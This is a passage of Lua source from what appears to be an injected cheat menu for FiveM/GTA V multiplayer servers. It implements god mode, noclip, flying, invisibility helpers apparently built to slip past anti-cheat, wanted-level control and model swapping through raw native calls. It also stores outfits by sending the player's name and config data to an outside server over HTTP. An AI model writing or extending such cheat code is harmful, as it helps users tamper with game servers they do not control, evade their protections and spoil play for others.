            t.foot_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 6, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.acc1_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 7, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.acc1_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 7, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.acc1_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 7, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.acc2_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 8, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.acc2_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 8, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.acc2_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 8, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.acc3_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 9, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.acc3_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 9, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.acc3_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 9, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.mask_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 10, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.mask_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 10, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.mask_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 10, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.aux_drawable = __REAPER1__.N.ReaperInvoke(0x67F3780DD425D4FC, p1, 11, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.aux_palette = __REAPER1__.N.ReaperInvoke(0xE3DD5F2A84B42281, p1, 11, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
            t.aux_texture = __REAPER1__.N.ReaperInvoke(0x04A355E041E004E6, p1, 11, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())

            return t
        end
    end
    function __REAPER1__.N.SetOutfit(p1,p2)
        __REAPER1__.N.ReaperInvoke(0x93376B65A266EB5F, p1, 0, p2.hat, p2.hat_texture, 1)
        __REAPER1__.N.ReaperInvoke(0x93376B65A266EB5F, p1, 1, p2.glasses, p2.glasses_texture, 1)
        __REAPER1__.N.ReaperInvoke(0x93376B65A266EB5F, p1, 2, p2.ear, p2.ear_texture, 1)
        __REAPER1__.N.ReaperInvoke(0x93376B65A266EB5F, p1, 6, p2.watch, p2.watch_texture, 1)
        __REAPER1__.N.ReaperInvoke(0x93376B65A266EB5F, p1, 7, p2.wrist, p2.wrist_texture, 1)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 0, p2.head_drawable, p2.head_texture, p2.head_palette)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 1, p2.beard_drawable, p2.beard_texture, p2.beard_palette)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 2, p2.hair_drawable, p2.hair_texture, p2.hair_palette)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 3, p2.torso_drawable, p2.torso_texture, p2.torso_palette)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 4, p2.legs_drawable, p2.legs_texture, p2.legs_palette)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 5, p2.hands_drawable, p2.hands_texture, p2.hands_palette)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 6, p2.foot_drawable, p2.foot_texture, p2.foot_palette)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 7, p2.acc1_drawable, p2.acc1_texture, p2.acc1_palette)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 8, p2.acc2_drawable, p2.acc2_texture, p2.acc2_palette)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 9, p2.acc3_drawable, p2.acc3_texture, p2.acc3_palette)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 10, p2.mask_drawable, p2.mask_texture, p2.mask_palette)
        __REAPER1__.N.ReaperInvoke(0x262B14F48D29DE80, p1, 11, p2.aux_drawable, p2.aux_texture, p2.aux_palette) end
    function __REAPER1__.N.RcCam(p1)
        if p1 then
            __REAPER1__.V.Rccam = __REAPER1__.N.ReaperInvoke(0xB51194800B257161, 'DEFAULT_SCRIPTED_CAMERA', __REAPER1__.N.ReaperInvoke(0x3FEF770D40960D5A, __REAPER1__.V.Rcbandito, false, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()), 0, 0, 0, 60.0, 1, 2)
            __REAPER1__.N.ReaperInvoke(0x026FB97D0A425F84, __REAPER1__.V.Rccam, true)
            __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, true, false, 0, true, true)
            __REAPER1__.N.ReaperInvoke(0x5640BFF86B16E8DC, __REAPER1__.V.Rccam, __REAPER1__.V.Rcbandito, 1, 1, 1, 1)
        else
            __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, __REAPER1__.V.Rclastcoords, true, true, true)
            __REAPER1__.N.ReaperInvoke(0x026FB97D0A425F84, __REAPER1__.V.Rccam, false)
            __REAPER1__.N.ReaperInvoke(0x865908C81A2C22E9, __REAPER1__.V.Rccam, false)
            __REAPER1__.N.ReaperInvoke(0x07E5B515DB0636FC, false, false, 0, true, true)
            __REAPER1__.N.ReaperInvoke(0x198F77705FA0931D, __REAPER1__.V.SelfPed)
            __REAPER1__.N.ReaperInvoke(0x3E93E06DB8EF1F30)
        end end
    function __REAPER1__.N.HudComp(p1,p2)
        if __REAPER1__.A[p1].sindex == 1 then
            __REAPER1__.N.ReaperInvoke(0x0B4DF1FA60C0E664, p2)
        else
            __REAPER1__.N.ReaperInvoke(0x6806C51AD12B83B8, p2)
        end
    end

    __REAPER1__.M = {
        player = {
            maxhealth = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    local t = {}
                    for i = 0, p2 do
                        table.insert(t, i)
                    end

                    __REAPER1__.A['player_sethealth'].func = t
                    __REAPER1__.A['player_sethealth'].sindex, __REAPER1__.A['player_sethealth'].cindex = 1, 1
                    __REAPER1__.N.SetEntityMaxHealth(__REAPER1__.V.SelfPed, p2)
                end)
            end,
            maxarmour = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    local t = {}
                    for i = 0, p2 do
                        table.insert(t, i)
                    end

                    __REAPER1__.A['player_setarmour'].func = t
                    __REAPER1__.A['player_setarmour'].sindex, __REAPER1__.A['player_setarmour'].cindex = 1, 1
                    __REAPER1__.N.SetPlayerMaxArmour(__REAPER1__.V.SelfPlayerId, p2)
                end)
            end,
            sethealth = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetEntityHealth(__REAPER1__.V.SelfPed, p2[p4])
            end,
            setarmour = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedArmour(__REAPER1__.V.SelfPed, p2[p4])
            end,
            revive = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.RespawnSelf(__REAPER1__.V.SelfPed, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed))
            end,
            suicide = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetEntityHealth(__REAPER1__.V.SelfPed, 0)
            end,
            fakedeath = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetEntityMaxHealth(__REAPER1__.V.SelfPed, p2 and 0 or #__REAPER1__.A['player_sethealth'].func - 1)
            end,
            resetstamina = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.ResetPlayerStamina(__REAPER1__.V.SelfPlayerId)
            end,
            invisible = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetEntityVisible(__REAPER1__.V.SelfPed, not p2)
            end,
            alpha = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetEntityAlpha(__REAPER1__.V.SelfPed, p2[p4], false)
            end,
            secinvisible = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfPed, p2)
            end,
            disableragdoll = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedCanRagdoll(__REAPER1__.V.SelfPed, not p2)
            end,
            freeze = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.V.SelfPed, p2)
            end,
            disabledrowning = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedDiesInWater(__REAPER1__.V.SelfPed, not p2)
            end,
            disableheadshot = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedSuffersCriticalHits(__REAPER1__.V.SelfPed, not p2)
            end,
            tazetime = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedMinGroundTimeForStungun(__REAPER1__.V.SelfPed, tonumber(p2))
            end,
            healthrecharge = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPlayerHealthRechargeMultiplier(__REAPER1__.V.SelfPlayerId, p2[p4])
            end,
            alwaysfriendly = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPedCanBeTargetted(__REAPER1__.V.SelfPed, not p2)
            end,
            cleartasks = function(p1, p2, p3, p4, p5, p6, p7)
                if p4 == 1 then
                    __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed)
                elseif p4 == 2 then
                    __REAPER1__.N.ClearPedSecondaryTask(__REAPER1__.V.SelfPed)
                else
                    __REAPER1__.N.ClearPedTasksImmediately(__REAPER1__.V.SelfPed)
                end
            end,
            maxwantedlevel = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetMaxWantedLevel(p2[p4])
            end,
            clearwantedlevel = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.ClearPlayerWantedLevel(__REAPER1__.V.SelfPlayerId)
            end,
            setwantedlevel = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPlayerWantedLevel(__REAPER1__.V.SelfPlayerId, p2[p4], false)
				__REAPER1__.N.SetPlayerWantedLevelNow(__REAPER1__.V.SelfPlayerId)
            end,
            becomeacop = function(p1, p2, p3, p4, p5, p6, p7)
                if p2 then
                    __REAPER1__.N.SetPedAsCop(__REAPER1__.V.SelfPed, true)
                else
                    __REAPER1__.N.SetPlayerModel(__REAPER1__.V.SelfPlayerId, __REAPER1__.N.GetEntityModel(__REAPER1__.V.SelfPed))
                end
            end,
            friendlygangs = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SetPlayerCanBeHassledByGangs(__REAPER1__.V.SelfPlayerId, not p2)
            end,
            movement = {
                automovement = function(p1, p2, p3, p4, p5, p6, p7)
                    if not p2 then
                        __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed)
                    else
                        __REAPER1__.V.Automove = false
                    end
                end,
                runspeed = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetRunSprintMultiplierForPlayer(__REAPER1__.V.SelfPlayerId, p2[p4])
                end,
                swimspeed = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetSwimMultiplierForPlayer(__REAPER1__.V.SelfPlayerId, p2[p4])
                end,
                fastmovement = function(p1,p2,p3,p4)
                    if p2 then
                        __REAPER1__.N.SetRunSprintMultiplierForPlayer(__REAPER1__.V.SelfPlayerId, 1.49)
                    else
                        if __REAPER1__.A['player:movement_runspeed'].sindex > 1 then
                            __REAPER1__.N.SetRunSprintMultiplierForPlayer(__REAPER1__.V.SelfPlayerId, __REAPER1__.A['player:movement_runspeed'].func[__REAPER1__.A['player:movement_runspeed'].sindex])
                        else
                            __REAPER1__.N.SetRunSprintMultiplierForPlayer(__REAPER1__.V.SelfPlayerId, 1.0)
                        end
                    end
                end,
                flying = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.FreezeEntityPosition(__REAPER1__.V.SelfPed, p2)
    
                    if __REAPER1__.A['player:movement_superman'].func then
                        __REAPER1__.N.TaskSkyDive(__REAPER1__.V.SelfPed)
                    end

                    
                    if __REAPER1__.A['player:movement_wextra'].sindex == 2 then
                        __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfPed, p2)
                    elseif __REAPER1__.A['player:movement_wextra'].sindex == 3 then
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.SelfPed, 69101.120, not p2)
                    elseif __REAPER1__.A['player:movement_wextra'].sindex == 4 then
                        __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfPed, p2)
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.SelfPed, 69101.120, not p2)
                    end
                end,
                wextra = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.A['player:movement_flying'].func then
                        if p4 == 2 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfPed, true)
                        elseif p4 == 4 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfPed, true)
                        elseif p4 == 1 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfPed, false)
                        end
                    end
                end,
                superman = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.A['player:movement_flying'].func then
                        if p2 then
                            __REAPER1__.N.TaskSkyDive(__REAPER1__.V.SelfPed)
                        else
                            __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed)
                        end
                    end
                end,
                wlagging = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.V.WalkingNoclipTimer = __REAPER1__.N.GetGameTimer()
                end,
                noclip = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.FreezeEntityPosition(__REAPER1__.V.SelfPed, p2)

                    if __REAPER1__.A['player:movement_nextra'].sindex == 2 then
                        __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfPed, p2)
                    elseif __REAPER1__.A['player:movement_nextra'].sindex == 3 then
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.SelfPed, 69101.120, not p2)
                    elseif __REAPER1__.A['player:movement_nextra'].sindex == 4 then
                        __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfPed, p2)
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.SelfPed, 69101.120, not p2)
                    end
                end,
                nextra = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.A['player:movement_noclip'].func then
                        if p4 == 2 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfPed, true)
                        elseif p4 == 4 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfPed, true)
                        elseif p4 == 1 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfPed, false)
                        end
                    end
                end,
                nlagging = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.V.NoclipTimer = __REAPER1__.N.GetGameTimer()
                end,
            },
            godmode = {
                secgod = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.SelfPed, p2)
                end,
                invincibility = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.SelfPed, p2)
                end,
                nodamage = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetEntityCanBeDamaged(__REAPER1__.V.SelfPed, not p2)
                end,
                demigod = function(p1, p2, p3, p4, p5, p6, p7)
                    if not p2 then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.V.SelfSemiGodProp)
                    else
                        __REAPER25__(function()
                            if __REAPER1__.F.RequestEntity(`prop_juicestand`) then
                                __REAPER1__.V.SelfSemiGodProp = __REAPER1__.N.CreateObject(`prop_juicestand`, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), true, true, false)
                                __REAPER1__.N.AttachEntityToEntity(__REAPER1__.V.SelfSemiGodProp, __REAPER1__.V.SelfPed, 0, 0, 0, 0, 0, 0, 0, false, false, false, true, 1, true)
                                __REAPER1__.N.SecureInvisible(__REAPER1__.V.SelfSemiGodProp, true)
                            end
                        end)
                    end
                end,
                definegod = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetEntityProofs(__REAPER1__.V.SelfPed, p2 and __REAPER1__.A['player:godmode_bulletproof'].func or false, p2 and __REAPER1__.A['player:godmode_fireproof'].func or false, p2 and __REAPER1__.A['player:godmode_explosionproof'].func or false, p2 and __REAPER1__.A['player:godmode_collisionproof'].func or false, p2 and __REAPER1__.A['player:godmode_meleeproof'].func or false, p2 and __REAPER1__.A['player:godmode_steamproof'].func or false, p2, p2 and __REAPER1__.A['player:godmode_drownproof'].func or false)
                end,
                toggledefinegod = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetEntityProofs(__REAPER1__.V.SelfPed, __REAPER1__.A['player:godmode_definegod'].func and __REAPER1__.A['player:godmode_bulletproof'].func, __REAPER1__.A['player:godmode_definegod'].func and __REAPER1__.A['player:godmode_fireproof'].func, __REAPER1__.A['player:godmode_definegod'].func and __REAPER1__.A['player:godmode_explosionproof'].func, __REAPER1__.A['player:godmode_definegod'].func and __REAPER1__.A['player:godmode_collisionproof'].func, __REAPER1__.A['player:godmode_definegod'].func and __REAPER1__.A['player:godmode_meleeproof'].func, __REAPER1__.A['player:godmode_definegod'].func and __REAPER1__.A['player:godmode_steamproof'].func, true, __REAPER1__.A['player:godmode_definegod'].func and __REAPER1__.A['player:godmode_drownproof'].func)
                end,
            },
            superpower = {
                nogravity = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetEntityHasGravity(__REAPER1__.V.SelfPed, not p2)
                end,
                ghostmode = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.GhostMode(__REAPER1__.V.SelfPed, p2)
                end,
                walkonwater = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.WaterObject) then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.V.WaterObject)
                    end
                end,
                shrink = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetPedConfigFlag(__REAPER1__.V.SelfPed, 223, p2)
                end,
                nocollision = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetEntityCollision(__REAPER1__.V.SelfPed, not p2, false)
                end,
                slap = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.ApplyForceToEntity(__REAPER1__.V.SelfPed, 1, 9500.0, 3.0, 7100.0, 1.0, 0.0, 0.0, 1, false, true, false, false)
                end,
            },
            skin = {
                randomoutfit = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetPedRandomComponentVariation(__REAPER1__.V.SelfPed, false)
                end,
                defaultoutfit = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetPedDefaultComponentVariation(__REAPER1__.V.SelfPed)
                end,
                randomprop = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetPedRandomProps(__REAPER1__.V.SelfPed)
                end,
                defaultprop = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.ClearPedProp(__REAPER1__.V.SelfPed, 0)
                    __REAPER1__.N.ClearPedProp(__REAPER1__.V.SelfPed, 1)
                    __REAPER1__.N.ClearPedProp(__REAPER1__.V.SelfPed, 2)
                    __REAPER1__.N.ClearPedProp(__REAPER1__.V.SelfPed, 6)
                    __REAPER1__.N.ClearPedProp(__REAPER1__.V.SelfPed, 7)
                end,
                prop = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.A[p7].sindex, __REAPER1__.A[p7].cindex = 1, 1
                    __REAPER1__.N.SetPedPropIndex(__REAPER1__.V.SelfPed, p6, p2[p4], __REAPER1__.A[p7].func[__REAPER1__.A[p7].sindex], true)
                    local prop = __REAPER1__.N.GetNumberOfPedPropTextureVariations(__REAPER1__.V.SelfPed, p6, p2[p4])
                    if prop ~= 0 then
                        local t = {}
                        for i = 0, prop - 1 do
                            table.insert(t, i)
                        end
                        __REAPER1__.A[p7].func = t
                    else
                        __REAPER1__.A[p7].func = {'None'}
                    end
                end,
                propvar = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetPedPropIndex(__REAPER1__.V.SelfPed, p6, __REAPER1__.A[p7].func[__REAPER1__.A[p7].sindex], p2[p4], true)
                end,
                clearprop = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.ClearPedProp(__REAPER1__.V.SelfPed, p6)
                end,
                comp = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.A[p7].sindex, __REAPER1__.A[p7].cindex = 1, 1
                    __REAPER1__.N.SetPedComponentVariation(__REAPER1__.V.SelfPed, p6, p2[p4], __REAPER1__.A[p7].func[__REAPER1__.A[p7].sindex], 1)
                    local prop = __REAPER1__.N.GetNumberOfPedTextureVariations(__REAPER1__.V.SelfPed, p6, p2[p4])
                    if prop ~= 0 then
                        local t = {}
                        for i = 0, prop - 1 do
                            table.insert(t, i)
                        end
                        __REAPER1__.A[p7].func = t
                    else
                        __REAPER1__.A[p7].func = {'None'}
                    end
                end,
                compvar = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetPedComponentVariation(__REAPER1__.V.SelfPed, p6, __REAPER1__.A[p7].func[__REAPER1__.A[p7].sindex], p2[p4], 1)
                end,
                saved = {
                    save = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER25__(function()
                            local ret = __REAPER1__.F.TextBox('', nil, 'altalanos', 'vegyes', 30, 'Outfit name')
                            if ret then
                                local t = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..'::stuff::hju456j'..[[&val=&append=]], 'host19.phl.hu', 443, true))
                                local outfit = __REAPER1__.N.CopyOutfit(__REAPER1__.V.SelfPed)

                                if t ~= nil then
                                    if not t['o'] then t['o'] = {} end
                                    t['o'][ret] = outfit
                                    __REAPER1__.F.WebSave('::stuff::hju456j', t, 5000)
                                else
                                    local t = {['o'] = {[ret] = outfit}}
                                    Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&append=]]..[[&cfg=]]..'::stuff::hju456j'..[[&val=]]..json.encode(t), 'host19.phl.hu', 443, true)
                                end

                                if __REAPER1__.T.Display['player:skin:savedoutfits'][2] == nil then
                                    __REAPER1__.T.Display['player:skin:savedoutfits'][2] = {text = 'Outfits', option = __REAPER1__.M.Separator}
                                    local dkey = 'player:skin:savedoutfits' .. ret .. 3
                                    local t = {text = ret, dkey = dkey, desc = ret .. ' outfit menu.', option = __REAPER1__.M.Menu_Button, func = {'player:skin:savedoutfits', dkey}, lasto = 1, scrollo = 0, addedo = 0}
                                    __REAPER1__.T.Display['player:skin:savedoutfits'][3] = t
                                    __REAPER1__.A[dkey] = t
                                    
                                    __REAPER1__.T.Display[dkey] = {
                                        {text = 'Set', dkey = dkey .. '_set', desc = 'Set this outfit.', afu = __REAPER1__.M.player.skin.saved.load, option = __REAPER1__.M.Button, extra = dkey},
                                        {text = 'Delete', dkey = dkey .. '_delete', desc = 'Delete this outfit.', afu = __REAPER1__.M.player.skin.saved.delete, option = __REAPER1__.M.Button, extra = dkey},
                                    }
                                else
                                    local dkey = 'player:skin:savedoutfits' .. ret .. #__REAPER1__.T.Display['player:skin:savedoutfits']
                                    local t = {text = ret, dkey = dkey, desc = ret .. ' outfit menu.', option = __REAPER1__.M.Menu_Button, func = {'player:skin:savedoutfits', dkey}, lasto = 1, scrollo = 0, addedo = 0}
                                    table.insert(__REAPER1__.T.Display['player:skin:savedoutfits'], t)
                                    __REAPER1__.A[dkey] = t
                                    
                                    __REAPER1__.T.Display[dkey] = {
                                        {text = 'Set', dkey = dkey .. '_set', desc = 'Set this outfit.', afu = __REAPER1__.M.player.skin.saved.load, option = __REAPER1__.M.Button, extra = dkey},
                                        {text = 'Delete', dkey = dkey .. '_delete', desc = 'Delete this outfit.', afu = __REAPER1__.M.player.skin.saved.delete, option = __REAPER1__.M.Button, extra = dkey},
                                    }
                                end

                                __REAPER1__.F.AddNotification('Saved outfit: ' .. ret, 5000, 0, 170, 10)
                            end
                        end)
                    end,
                    load = function(p1, p2, p3, p4, p5, p6, p7)
                        local text = __REAPER1__.A[p6].text
                        local t = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..'::stuff::hju456j'..[[&val=&append=]], 'host19.phl.hu', 443, true))

                        __REAPER1__.N.SetOutfit(__REAPER1__.V.SelfPed, t['o'][text])
                        __REAPER1__.F.AddNotification('Set outfit: ' .. text, 5000, 0, 170, 10)
                    end,
                    delete = function(p1, p2, p3, p4, p5, p6, p7)
                        local text = __REAPER1__.A[p6].text
                        local t = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..'::stuff::hju456j'..[[&val=&append=]], 'host19.phl.hu', 443, true))
                        
                        t['o'][text] = nil
                        Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&append=]]..[[&cfg=]]..'::stuff::hju456j'..[[&val=]]..json.encode(t), 'host19.phl.hu', 443, true)

                        __REAPER1__.F.DeleteConfigTab('player:skin:savedoutfits', p6, 3)
                        __REAPER1__.F.AddNotification('Deleted outfit: ' .. text, 5000, 0, 170, 10)
                    end,
                },
            },
            model = {
                modelchange = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        local hash = __REAPER1__.N.GetHashKey(type(p2) == 'table' and p2[p4] or p2)
                        local timer = 0
                        if __REAPER1__.F.RequestEntity(hash) and __REAPER1__.N.IsModelInCdimage(hash) and __REAPER1__.N.IsModelValid(hash) then
                            __REAPER1__.N.SetPlayerModel(__REAPER1__.V.SelfPlayerId, hash)
                            __REAPER1__.N.SetPedDefaultComponentVariation(__REAPER1__.N.PedId())
                        end
                    end)
                end
            },
            vision = {
                setvisionstrength = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetTimecycleModifierStrength(__REAPER1__.F.IntToFloat(p4))
                    __REAPER1__.N.SetExtraTimecycleModifierStrength(__REAPER1__.F.IntToFloat(p4))
                end,
                default = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVisionClear()
                end,
                nightvision = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetNightvision(true)
                end,
                thermal = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetSeethrough(true)
                end,
                setvision = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetTimecycleModifier(p6)
                    __REAPER1__.N.SetTimecycleModifierStrength(__REAPER1__.F.IntToFloat(__REAPER1__.A['player:vision_visionstrength'].sindex))
                end,
                setsecvision = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetExtraTimecycleModifier(p6)
                    __REAPER1__.N.SetExtraTimecycleModifierStrength(__REAPER1__.F.IntToFloat(__REAPER1__.A['player:vision_visionstrength'].sindex))
                end,
            },
            animation = {
                animation = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestAnimDict(__REAPER1__.A['player:animation_animdict'].func) then
                            local moveable = 10
                            local duration = __REAPER1__.A['player:animation_duration'].sindex == 1 and -1 or __REAPER1__.A['player:animation_duration'].sindex
        
                            if __REAPER1__.A['player:animation_fuckup'].func then
                                moveable = 256
                            elseif __REAPER1__.A['player:animation_moveable'].func and __REAPER1__.A['player:animation_looped'].func then
                                moveable = 51
                            elseif __REAPER1__.A['player:animation_moveable'].func then
                                moveable = 48
                            elseif __REAPER1__.A['player:animation_looped'].func then
                                moveable = 1
                            end
        
                            __REAPER1__.N.TaskPlayAnim(__REAPER1__.V.SelfPed, __REAPER1__.A['player:animation_animdict'].func, p2, 2.0, 2.0, duration, moveable, 0, false, false, false)
                        end
                    end)
                end,
                stopanimation = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.ClearPedTasksImmediately(__REAPER1__.V.SelfPed)
                    __REAPER1__.N.ResetPedMovementClipset(__REAPER1__.V.SelfPed, 0.0)
                end,
                scenario = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.TaskStartScenarioInPlace(__REAPER1__.V.SelfPed, p2, -1, true)
                end,
                walkstyle = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestAnimSet(p2) then
                            __REAPER1__.N.SetPedMovementClipset(__REAPER1__.V.SelfPed, p2, 0.2)
                        end
                    end)
                end,
            },
            particle = {
                playparticle = function(p1, p2, p3, p4, p5, p6, p7)
                    local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
